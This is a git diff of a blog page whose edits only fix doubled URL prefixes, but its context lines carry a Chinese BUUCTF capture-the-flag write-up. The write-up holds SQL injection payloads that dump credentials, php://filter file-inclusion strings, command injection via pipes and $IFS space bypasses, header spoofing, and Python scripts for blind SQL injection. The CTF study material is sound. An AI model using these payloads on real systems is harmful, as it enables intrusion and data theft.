@@ -3,10 +3,10 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>BUUCTF | Gridea</title>
-<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624178139382">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="BUUCTF | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="BUUCTF | Gridea - Atom Feed" href="https://jinqipiaopiao.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -24,8 +24,8 @@
     <div class="main">
       <div class="main-content">
         <div class="site-header">
-  <a href="https://https://jinqipiaopiao.github.io/">
-  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  <a href="https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624178139382" alt="">
   </a>
   <h1 class="site-title">
     Gridea
@@ -112,19 +112,19 @@
 <pre><code>select *,1 from Flag
 </code></pre>
 <p>也就是直接查询出了Flag表中的所有内容<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622963455648.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622963455648.png" alt="" loading="lazy"><br>
 解法2<br>
 输入的内容为</p>
 <pre><code>1;set sql_mode=pipes_as_concat;select 1
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622963484692.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1622963484692.png" alt="" loading="lazy"><br>
 我们执行的语句分别为</p>
 <pre><code>select 1
 set sql_mode=pipes_as_concat
 select 1||flag from Flag
 </code></pre>
 <p>读出flag<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622963518649.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622963518649.png" alt="" loading="lazy"></p>
 <p>————————————————<br>
 版权声明：本文为CSDN博主「一只小白来了」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
 原文链接：https://blog.csdn.net/weixin_44866139/article/details/105857487</p>
@@ -221,11 +221,11 @@ allow_url_fopen ：off/on
 
 allow_url_include：off/on
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1622964969941.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1622964969941.png" alt="" loading="lazy"></figure>
 <p>测试现象：<br>
 http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./cmd.php<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622964973937.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622964977636.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622964973937.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622964977636.png" alt="" loading="lazy"></p>
 <p>测试现象：</p>
 <pre><code>http://127.0.0.1/cmd.php?file=php://input
 
@@ -236,28 +236,28 @@ https://www.cnblogs.com/cmredkulaa/p/14008645.html</p>
 <h1 id="极客大挑战-2019secret-file">[极客大挑战 2019]Secret File</h1>
 <p>BUFFctf蒋璐媛的秘密<br>
 打开在线场景，发现三个大字蒋璐媛<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966646571.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966646571.png" alt="" loading="lazy"><br>
 那么就继续看了，首先就应该看看他的源码了：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966650090.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966650090.png" alt="" loading="lazy"><br>
 打开他的这个下面的php文件瞅瞅：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966653167.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966653167.png" alt="" loading="lazy"><br>
 是个按钮我们就要一一分析了：</p>
 <p>按了一下按钮发现：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966655922.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966655922.png" alt="" loading="lazy"><br>
 那就要来看看源码了：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966658952.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966658952.png" alt="" loading="lazy"><br>
 从这里看它是有个action.php,说明它跳的太快用burpsuite抓一下<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966662432.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966662432.png" alt="" loading="lazy"><br>
 看来问题就出在这个ser3t文件上。</p>
 <p>那我们就输入一下：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966670380.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966674246.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966670380.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966674246.png" alt="" loading="lazy"><br>
 因为刚刚刚好有一个题就是用的base64的隐写所以就用这个方法了哈哈哈</p>
 <pre><code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622966678771.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1622966678771.png" alt="" loading="lazy"><br>
 然后用base64解码即<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622966696532.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622966696532.png" alt="" loading="lazy"></p>
 <p>参考自：https://blog.csdn.net/vsdvscs/article/details/116563866</p>
 <h1 id="极客大挑战-2019lovesql1">[极客大挑战 2019]LoveSQL1</h1>
 <p>此题考察的就是简单的sql注入只不过要注意的是用group_concat()（这个是将组中的字符串连接成为具有各种选项的单个字符串函数）和concat_ws(&quot;?&quot;,?,?)（是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。）不然就显示不出来</p>
@@ -267,50 +267,50 @@ https://www.cnblogs.com/cmredkulaa/p/14008645.html</p>
 password：123
 </code></pre>
 <p>显示的是<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969725148.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969725148.png" alt="" loading="lazy"><br>
 然后试着用这个账号和密码进行登录发现没有什么用一直都是同一个页面然后就进行sql注入的各种语句查表，列和最后所需要的值（密码随意不能不写写个123也行）</p>
 <p>username：<br>
 ' or 1=1 order by 1,2,3,4#      多次试验后发现3回显正确<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969728849.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969728849.png" alt="" loading="lazy"><br>
 ' and 1=2 union select 1,2,3#       测试回显的是哪几个<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969732155.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969732155.png" alt="" loading="lazy"><br>
 ' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969734968.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969734968.png" alt="" loading="lazy"><br>
 ' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='l0ve1ysq1'#<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969738399.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969738399.png" alt="" loading="lazy"><br>
 ' and 1=2 union select 1,group_concat(concat_ws(&quot;:::&quot;,id,username,password)),3 from l0ve1ysq1#<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969742646.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969742646.png" alt="" loading="lazy"></p>
 <h1 id="actf2020-新生赛exec1">[ACTF2020 新生赛]Exec1</h1>
 <p>首先先ping一下127.0.0.1<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969934067.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969934067.png" alt="" loading="lazy"><br>
 然后看看有什么文件直接127.0.0.1 | ls ../../../../../<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622969929957.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622969929957.png" alt="" loading="lazy"><br>
 然后直接打开即可127.0.0.1 | cat ../../../../../flag<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622970016783.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622970016783.png" alt="" loading="lazy"></p>
 <p>像这种什么都没过滤的题目，可以利用常见管道符直接执行命令:<br>
 常见管道符</p>
 <p>1、|（就是按位或），直接执行|后面的语句<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622970190689.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622970190689.png" alt="" loading="lazy"><br>
 2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622970194252.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622970194252.png" alt="" loading="lazy"><br>
 3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622970198223.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622970198223.png" alt="" loading="lazy"><br>
 4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令<br>
 这里没试出来flag，用cmd试一下：<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622970203946.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622970203946.png" alt="" loading="lazy"><br>
 5、;（linux下有的，和&amp;一样的作用）<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622970207060.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622970207060.png" alt="" loading="lazy"><br>
 命令执行漏洞可以看这位师傅的博客：<br>
 http://www.ghtwf01.cn/index.php/archives/273/</p>
 <p>参考自：https://blog.csdn.net/weixin_44348894/article/details/105347418?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase</p>
 <h1 id="gxyctf2019ping-ping-ping">[GXYCTF2019]Ping Ping Ping</h1>
 <p>打开是这样子的。给了/?ip= 后边应该是我们所想要执行的语句。先随便ping一下<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971962814.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971962814.png" alt="" loading="lazy"><br>
 有回显，我们在在后边继续执行语句。先查看一下ls;<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971965668.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971965668.png" alt="" loading="lazy"><br>
 这里发现终端有一个flag.php和一个Index.php<br>
 cat flag.php一下试一试<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971968514.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971968514.png" alt="" loading="lazy"><br>
 发现空格被过滤了,去百度查询了一下绕过空格的几个办法<br>
 **空格过滤 **</p>
 <pre><code>${IFS}替换
@@ -321,38 +321,38 @@ ${IFS替换
 %09替换
 </code></pre>
 <p>我们一个个来试一下<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971972295.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971972295.png" alt="" loading="lazy"><br>
 用第一个<code>${IFS}</code>时候发现符号被过滤了</p>
 <p>使用第二个<code>$IFS$1</code>发现可以 说明{}被过滤了,但出现了<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971975513.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971975513.png" alt="" loading="lazy"><br>
 这样说明flag被过滤了 去看一下Index.php<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971979305.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971979305.png" alt="" loading="lazy"><br>
 发现源码出来了。可以看到flag.&lt;&gt;.{}都被过滤了。bash也被过滤。这时候我们可以想着试一下变量拼接.<br>
 ?ip=1;a=g;cat$IFS<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mi>f</mi><mi>l</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">1fla</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span></span></span></span>a.php;<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622971982645.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622971982645.png" alt="" loading="lazy"><br>
 打开源码即可看到flag</p>
 <h1 id="极客大挑战-2019knife">[极客大挑战 2019]Knife</h1>
 <p>提示很明显说明此题使用蚁剑进行连接所需传入的东西已经万全准备就绪<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622978455383.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622978459228.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622978462363.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622978455383.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622978459228.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622978462363.png" alt="" loading="lazy"></p>
 <h1 id="极客大挑战-2019http1">[极客大挑战 2019]Http1</h1>
 <p>打开网页发现啥也没有然后就查看源码发现有一个Secret.php<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622979681162.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622979681162.png" alt="" loading="lazy"><br>
 然后用burpsuite抓包然后一直发送发送给repeater因为可以多次提交<br>
 然后打开发现<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622979967597.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622979967597.png" alt="" loading="lazy"><br>
 添加这个：Referer:https://www.Sycsecret.com<br>
 然后发送<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622979970427.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622979970427.png" alt="" loading="lazy"><br>
 然后修改User-Agent:Syclover<br>
 然后发送<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622979973326.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622979973326.png" alt="" loading="lazy"><br>
 然后添加X-Forwarded-For:127.0.0.1<br>
 然后<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622979977436.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622979977436.png" alt="" loading="lazy"><br>
 总体修改<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622979980999.png" alt="" loading="lazy"></p>
+<img src="https://jinqipiaopiao.github.io//post-images/1622979980999.png" alt="" loading="lazy"></p>
 <h1 id="zjctf-2019nizhuansiwei">[ZJCTF 2019]NiZhuanSiWei</h1>
 <p>1:data伪协议写入文件<br>
 2：php://</p>
@@ -444,9 +444,9 @@ echo serialize($a);
 <p>参考链接https://www.redmango.top/articles/article/40/</p>
 <p>simple sql 简单的sql过滤绕过<br>
 寻找注入点<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089368829.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089368829.png" alt="" loading="lazy"><br>
 只有一个输入框，抓包看是post提交。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089372575.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089372575.png" alt="" loading="lazy"><br>
 依次输入</p>
 <pre><code>' =&gt; bool(false)
 and 1=1 =&gt; SQL Injection Checked.
@@ -456,12 +456,12 @@ and 1=1 =&gt; SQL Injection Checked.
 （下载了一份fuzz dict: dictionary-master）
 使用 sql_fuzz.txt 字典 
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1624089377469.png" alt="" loading="lazy"><br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089381519.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1624089377469.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089381519.png" alt="" loading="lazy"><br>
 但是 ascii/regexp/substr等函数都没过滤。xor被过滤，但是 ^/|/= 没有过滤，所以可以构造一个true表达式：<br>
 0^(2&gt;1) =&gt; Hello this is Aurora<br>
 0^(2&gt;1) =&gt; Error Occured When Fetch Result.<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089385693.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089385693.png" alt="" loading="lazy"><br>
 因此，注入点就是：<br>
 0^(TRUE表达式) =&gt; 返回 Hello this is Auro<br>
 0^(False表达式) =&gt; 返回 Error Occured When Fetch Result.<br>
@@ -480,16 +480,16 @@ mid((select flag from flag )from(1))  // 获取第一个
 ascii(mid((select flag from flag )from(1)))=102 // ascii('flag') 默认只返回f的ascii值，f对应102
 ascii(mid((select%0aflag%0afrom%0aflag)from(1)))=102 // 绕过空格过滤  
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1624089391290.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1624089391290.png" alt="" loading="lazy"><br>
 正常显示 id=1 的内容，说明答案的第一个字符是f。<br>
 编写 exp 程序</p>
 <p>知道了注入点，剩下的就是自动化。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089395786.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089395786.png" alt="" loading="lazy"><br>
 先在python里面验证下，发现同样的payload，在burp可以，代码却不行。唯一的原因就在 %0a 这个编码的地方了。<br>
 参考这篇文章：https://blog.csdn.net/M1mory/article/details/58309378<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089400139.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089400139.png" alt="" loading="lazy"><br>
 加上代理，自己在burp可以看到requests发包的情况，还要加上 content-type 头部，否则无返回信息<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1624089404183.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624089404183.png" alt="" loading="lazy"><br>
 基于此，写出exp代码：</p>
 <pre><code>import requests
 
@@ -510,7 +510,7 @@ print(&quot;[%d]%s=&gt;%s\t%s&quot; % (i, c, len(r.text), payload))
 
 print(''.join(ret))
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1624089407690.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1624089407690.png" alt="" loading="lazy"><br>
 这段代码速度太慢，用二分法进行代码优化：</p>
 <pre><code>import requests
 
@@ -554,7 +554,7 @@ mid = (start + end) // 2
 tmp = &quot;start=&gt;{0},mid={1},end={2}&quot;.format(start,mid,end)
 print(''.join(chr(x) for x in mids))
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
 
               </div>
               <div class="toc-container">
@@ -579,7 +579,7 @@ print(''.join(chr(x) for x in mids))
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">
+            <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">
               <h3 class="post-title">
                 利用预编译来SQL注入
               </h3>
@@ -591,7 +591,7 @@ print(''.join(chr(x) for x in mids))
 
         <div class="site-footer">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+  <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
